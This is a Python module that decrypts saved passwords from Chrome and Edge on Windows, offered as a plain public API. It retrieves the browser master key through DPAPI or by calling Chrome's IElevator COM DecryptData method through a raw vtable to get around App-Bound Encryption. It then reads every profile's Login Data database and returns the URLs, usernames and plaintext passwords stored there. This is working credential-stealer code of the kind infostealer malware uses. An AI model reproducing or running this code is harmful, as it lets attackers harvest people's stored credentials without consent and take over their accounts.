"""
Decrypt saved passwords from Chrome and Edge (Chromium-based browsers).

Key decryption strategy:
  1. DPAPI (CryptUnprotectData)  — Chrome < 127, pre-ABE
  2. IElevator COM vtable call   — Chrome 127+ App-Bound Encryption (ABE)
     DecryptData sits at vtable[8] of IElevator (IUnknown QI/AddRef/Release
     at 0-2, then 5 IElevator methods before it).

Requires pywin32 and pycryptodome (already in requirements.txt).
"""
import base64
import ctypes
import json
import os
import shutil
import sqlite3
import tempfile

# ── OLE helpers for IElevator COM call ───────────────────────────────────────

_ole32    = ctypes.WinDLL("ole32")
_oleaut32 = ctypes.WinDLL("oleaut32")

_ole32.CoInitializeEx.restype   = ctypes.HRESULT
_ole32.CoInitializeEx.argtypes  = [ctypes.c_void_p, ctypes.c_ulong]
_ole32.CLSIDFromString.restype  = ctypes.HRESULT
_ole32.CLSIDFromString.argtypes = [ctypes.c_wchar_p, ctypes.c_void_p]
_ole32.CoCreateInstance.restype  = ctypes.HRESULT
_ole32.CoCreateInstance.argtypes = [ctypes.c_void_p, ctypes.c_void_p,
                                     ctypes.c_ulong, ctypes.c_void_p,
                                     ctypes.c_void_p]

_oleaut32.SysAllocStringByteLen.restype  = ctypes.c_void_p
_oleaut32.SysAllocStringByteLen.argtypes = [ctypes.c_char_p, ctypes.c_uint]
_oleaut32.SysFreeString.restype  = None
_oleaut32.SysFreeString.argtypes = [ctypes.c_void_p]
_oleaut32.SysStringByteLen.restype  = ctypes.c_uint
_oleaut32.SysStringByteLen.argtypes = [ctypes.c_void_p]

_COINIT_MULTITHREADED = 0
_CLSCTX_LOCAL_SERVER  = 4
_S_OK                 = 0

# vtable index of DecryptData inside IElevator (after IUnknown 0-2 + 5 other methods)
_DECRYPT_VTABLE_IDX = 8

# IElevator IID and per-browser CLSIDs
_ELEVATOR_IID = "{463ABECF-9555-4147-9990-E7BC564875F1}"

_ELEVATOR_CLSIDS = {
    "Chrome": [
        "{708860E0-F641-4611-8895-7D867DD3675B}",  # Stable
        "{DD2CCCFB-8EEF-4A58-9891-B7AB9B1F7BF0}",  # Beta
        "{DA0B63A9-4E21-4A0E-9A61-F19F48F84F3E}",  # Dev
        "{47E5FC5E-F22F-4FCF-9DFB-B10CCDD7EF3D}",  # Canary
    ],
    "Edge": [
        "{1FCBE96C-1697-43AF-9140-2897C7C69767}",  # Stable
        "{DDC0BC04-B7F8-4E8E-AA08-B02EBEBCABD5}",  # Beta
    ],
}

# Edge may use a different IElevator IID; try both
_ELEVATOR_IIDS = {
    "Chrome": [_ELEVATOR_IID],
    "Edge":   ["{A779D01E-B099-4081-A7B3-A0F41FA4A3C0}", _ELEVATOR_IID],
}


def _guid_buf(guid_str):
    buf = (ctypes.c_byte * 16)()
    _ole32.CLSIDFromString(guid_str, ctypes.byref(buf))
    return buf


def _ielevator_decrypt(clsid_str, iid_str, blob):
    """
    Call IElevator.DecryptData(blob) via raw vtable.
    Returns decrypted bytes or None on failure.
    """
    try:
        _ole32.CoInitializeEx(None, _COINIT_MULTITHREADED)
    except Exception:
        pass

    clsid = _guid_buf(clsid_str)
    iid   = _guid_buf(iid_str)
    ppv   = ctypes.c_void_p()

    hr = _ole32.CoCreateInstance(
        ctypes.byref(clsid), None, _CLSCTX_LOCAL_SERVER,
        ctypes.byref(iid), ctypes.byref(ppv),
    )
    if hr != _S_OK or not ppv.value:
        return None

    vtbl = ctypes.cast(ppv.value, ctypes.POINTER(ctypes.POINTER(ctypes.c_size_t)))
    try:
        fn_addr = vtbl[0][_DECRYPT_VTABLE_IDX]
        DecryptData = ctypes.WINFUNCTYPE(
            ctypes.HRESULT,
            ctypes.c_void_p,                  # this
            ctypes.c_void_p,                  # BSTR ciphertext
            ctypes.POINTER(ctypes.c_void_p),  # BSTR* plaintext (out)
            ctypes.POINTER(ctypes.c_ulong),   # DWORD* last_error (out)
        )(fn_addr)

        in_bstr  = _oleaut32.SysAllocStringByteLen(blob, len(blob))
        out_bstr = ctypes.c_void_p()
        last_err = ctypes.c_ulong(0)

        hr2 = DecryptData(ppv, in_bstr, ctypes.byref(out_bstr), ctypes.byref(last_err))
        _oleaut32.SysFreeString(in_bstr)

        if hr2 == _S_OK and out_bstr.value:
            n      = _oleaut32.SysStringByteLen(out_bstr.value)
            result = (ctypes.c_char * n).from_address(out_bstr.value).raw
            _oleaut32.SysFreeString(out_bstr.value)
            return result
    except Exception:
        pass
    finally:
        try:
            fn_release = vtbl[0][2]  # IUnknown::Release
            Release = ctypes.WINFUNCTYPE(ctypes.c_ulong, ctypes.c_void_p)(fn_release)
            Release(ppv)
        except Exception:
            pass
    return None


# ── Key retrieval ─────────────────────────────────────────────────────────────

def _get_key(local_state_path, browser="Chrome"):
    with open(local_state_path, "r", encoding="utf-8") as f:
        data = json.load(f)
    blob = base64.b64decode(data["os_crypt"]["encrypted_key"])[5:]  # strip DPAPI prefix

    # Layer 1: try DPAPI (Chrome < 127 / pre-ABE)
    try:
        import win32crypt
        return win32crypt.CryptUnprotectData(blob, None, None, None, 0)[1]
    except Exception:
        pass

    # Layer 2: try IElevator COM (Chrome 127+ ABE)
    for clsid in _ELEVATOR_CLSIDS.get(browser, []):
        for iid in _ELEVATOR_IIDS.get(browser, [_ELEVATOR_IID]):
            key = _ielevator_decrypt(clsid, iid, blob)
            if key:
                return key

    raise RuntimeError(f"Could not decrypt master key for {browser} (DPAPI and IElevator both failed)")


# ── Per-password decryption ───────────────────────────────────────────────────

def _decrypt_password(blob, key):
    if not blob:
        return ""
    try:
        if blob[:3] in (b"v10", b"v11"):
            from Crypto.Cipher import AES
            iv, enc, tag = blob[3:15], blob[15:-16], blob[-16:]
            return AES.new(key, AES.MODE_GCM, iv).decrypt_and_verify(enc, tag).decode("utf-8", errors="replace")
        import win32crypt
        return win32crypt.CryptUnprotectData(blob, None, None, None, 0)[1].decode("utf-8", errors="replace")
    except Exception as e:
        return f"[decrypt failed: {e}]"


# ── DB reader ─────────────────────────────────────────────────────────────────

def _read_logins(login_data_path, key, browser, profile_name):
    tmp = tempfile.mktemp(suffix=".db")
    try:
        shutil.copy2(login_data_path, tmp)
        con  = sqlite3.connect(tmp)
        rows = con.execute(
            "SELECT origin_url, username_value, password_value FROM logins"
        ).fetchall()
        con.close()
    finally:
        try:
            os.remove(tmp)
        except Exception:
            pass

    return [
        {
            "browser":  browser,
            "profile":  profile_name,
            "url":      url,
            "username": username,
            "password": _decrypt_password(pw_blob, key),
        }
        for url, username, pw_blob in rows
    ]


# ── Browser paths ─────────────────────────────────────────────────────────────

_LOCAL = os.environ.get("LOCALAPPDATA", "")
_BROWSERS = {
    "Chrome": os.path.join(_LOCAL, r"Google\Chrome\User Data"),
    "Edge":   os.path.join(_LOCAL, r"Microsoft\Edge\User Data"),
}


# ── Public API ────────────────────────────────────────────────────────────────

def get_browser_passwords():
    """Return list of {browser, profile, url, username, password} dicts."""
    results = []
    for browser, user_data in _BROWSERS.items():
        if not os.path.isdir(user_data):
            continue
        local_state = os.path.join(user_data, "Local State")
        if not os.path.isfile(local_state):
            continue
        try:
            key = _get_key(local_state, browser)
        except Exception:
            continue

        for profile in ["Default"] + [f"Profile {i}" for i in range(1, 30)]:
            db = os.path.join(user_data, profile, "Login Data")
            if not os.path.isfile(db):
                continue
            try:
                results.extend(_read_logins(db, key, browser, profile))
            except Exception:
                continue

    return results
